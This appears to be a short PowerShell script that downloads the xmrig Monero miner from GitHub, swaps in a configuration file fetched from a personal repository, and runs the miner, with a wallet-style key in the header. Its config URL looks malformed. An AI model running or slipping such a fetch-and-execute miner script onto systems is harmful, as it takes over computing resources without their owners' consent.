# Public key:
# 87ZS6W3ozZkRYv9P3SsvMG3FrUbUdw8AedkjksJyLUJvPsg3HaqGUFPavnmKfJ8g9PKQ2FGPo9XSzXKceBjiZgpb4qxvtaQ

Set-Location
New-Item mining -ItemType Directory -ea 0
Set-Location mining/
Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-gcc-win64.zip -OutFile xmrig.zip
Expand-Archive .\xmrig.zip
Set-Location .\xmrig\
Set-Location .\xmrig-6.12.1\
Remove-Item .\config.json
Invoke-WebRequest https://raw.githubusercontent.com/g00sifer/MoneroMiner/blob/main/config.json -OutFile config.json
.\xmrig.exe
